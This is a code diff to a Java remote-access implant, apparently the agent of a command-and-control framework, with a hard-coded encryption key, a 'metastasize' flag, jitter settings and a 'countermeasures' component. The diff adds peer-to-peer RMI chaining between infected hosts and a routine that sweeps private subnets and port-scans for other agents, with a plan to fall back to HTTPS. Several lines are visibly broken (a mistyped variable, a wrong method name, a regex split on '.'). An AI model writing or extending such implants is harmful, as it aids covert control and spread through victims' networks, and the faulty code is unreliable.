@@ -59,7 +59,9 @@ import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.net.NetworkInterface;
+import java.net.Socket;
 import java.net.SocketException;
 import java.net.URL;
 import java.net.URI;
@@ -78,7 +80,8 @@ class nConfig
     public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static int metastasize = 0;
     public static String upstream = "127.0.0.1";
-    public static int isDownstream = 0;
+    public static int upstreamPort = 35506;
+    public static int springReachable = 1;
     public static int isKeystone = 0;
     public static int stutterMin = 10;
     public static int stutterMax = 50;
@@ -99,14 +102,13 @@ public class Main
     static public String sessUUID = "";
     static public String nonce = "";
     static public ArrayList tasks = new ArrayList();
-    static public ArrayList downstreamTasks = new ArrayList();
     static public Hashtable downstreamAgents = new Hashtable();
     static public ArrayList output = new ArrayList();
     static private countermeasures cm = new countermeasures();
     static private utilitarian nUtil = new utilitarian();
     static private pkgLib packager = new pkgLib();
     static private nConfig config = new nConfig();
-    static public netwHttps nComm = new netwHttps();
+    static public network nComm = new network();
 
     public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
@@ -137,10 +139,16 @@ public class Main
 
         int c;
 
-        System.out.println(config.encKey);
-        System.out.println(nonce);
+        //rewrite
+        // 1. scan for p2p
+        // 2. if p2p available, use it
+        // 3. if p2p is not available, try connecting via https
+        // 4. if downstream > 5, try reaching out via https
+        // 5. if impossible to reach https endpoint
+
         for (c=0; c<4; c++)
         {
+
             try
             {  
                 String cReq = nComm.request(nComm.mkAuth(),"auth");
@@ -500,17 +508,23 @@ public class Main
 
     public interface P2PInterface extends Remote
     {
+        //creates cookie session object and adds uuid to downstream agents
         public String auth(String uuid, String passwd) throws RemoteException;
+        //hands off upstream key (should replicate across all downstream agents) to replace default
         public String kex(String uuid, String cookie, String nonce) throws RemoteException;
+        //retrieve task data
         public ArrayList get(String uuid, String cookie, String nonce) throws RemoteException;
+        //send output
         public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException;
+        //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
+        public String disconnect(String uuid, String cookie, String nonce) throws RemoteException;
     }
 
     public class P2PSrv extends UnicastRemoteObject implements RMIInterface
     {
         protected P2PSrv() throws RemoteException
         {
-            super();
+            super(config.upstreamPort);
         }
 
         @Override
@@ -539,7 +553,7 @@ public class Main
         }
 
         @Override
-        public String kex (String uuid, String cookie, String downstreamNonce) throws RemoteException
+        public String kex(String uuid, String cookie, String downstreamNonce) throws RemoteException
         {
             String authBlob = new String(
                 Base64.getDecoder().decode(
@@ -591,7 +605,7 @@ public class Main
                     //data on backend needs to account for downstream agents so the upstream agent can receive the tasks
                     //add downstreamtasks variable into agent config
                     // make tasking search downstreamtasks variable
-                    if (taskTable.keySet().contains(uuid))
+                    if (!taskTable.keySet().contains(sessUUID))
                     {
                         taskData.add(taskTable);
                     }
@@ -630,6 +644,29 @@ public class Main
             }
         }
 
+        @Override
+        public String disconnect(String uuid, String cookie, String downstreamNonce) throws RemoteException
+        {
+            String authBlob = new String(
+                Base64.getDecoder().decode(
+                    secInst.decrypt(
+                        cookie.getBytes(),
+                        config.encKey.getBytes(),
+                        downstreamNonce.getBytes()
+                    )
+                )
+            );
+            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
+            {
+                downstreamAgents.remove(uuid);
+                return "ok";
+            }
+            else
+            {
+                return "error";
+            }
+        }
+
 
         mkCookie(String uuid, String passMat)
         {
@@ -654,8 +691,67 @@ public class Main
 
     }
 
-    private static class netwHttps
+    class network
     {
+        public ArrayList findOpenRMI(ArrayList addresses)
+        {
+            ArrayList localNodes = new ArrayList();
+            for (int h=0;h<addresses.size();h++)
+            {
+                try (Socket socket = new Socket()) 
+                {
+                    String host = addresses.get(h);
+                    socket.connect(new InetSocketAddress(host, config.upstreamPort), 1000);
+                    localNodes.add(host);
+                    socket.close();
+                } 
+                catch (IOException e) 
+                {
+
+                }
+            }
+            return localNodes;
+        }
+
+        public ArrayList calcSubnetAddrs(ArrayList ipAddresses)
+        {
+            ArrayList subnetAddrs = new ArrayList();
+            for (int a=0;a<ipAddress.size();a++)
+            {
+                String[] prefix = ipAddresses.get(a).split(".");
+                for (int o=1; o<255; o++)
+                {
+                    subnetAddrs.add(String.join(".",prefix[0],prefix[1],prefix[2],String.valueof(o)));
+                }
+            }
+            return subnetAddrs;
+        }
+
+        public ArrayList findP2P()
+        {
+            ArrayList ipAddresses = new ArrayList();
+
+            Hashtable ifaces = nUtil.getAddress();
+            
+            Enumeration<String> i = ifaces.keys();
+
+            while (i.hasMoreElements())
+            {
+                String ifaceKey = i.nextElement();
+                ArrayList ifaceData = (ArrayList) ifaces.get(ifaceKey);
+
+                if (ifaceData.contains("192.168.") || ifaceData.contains("10.") || ifaceData.contains("172.16."))
+                {
+                    ipAddresses.add(ifaceData.get(1));
+                }
+            }
+
+            ArrayList netAddresses = calcSubnetAddrs(ipAddresses);
+            ArrayList localNodes = findOpenRMI(netAddresses);
+
+            return localNodes;
+        }
+
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
             Hashtable<String,String> authData = new Hashtable<>();
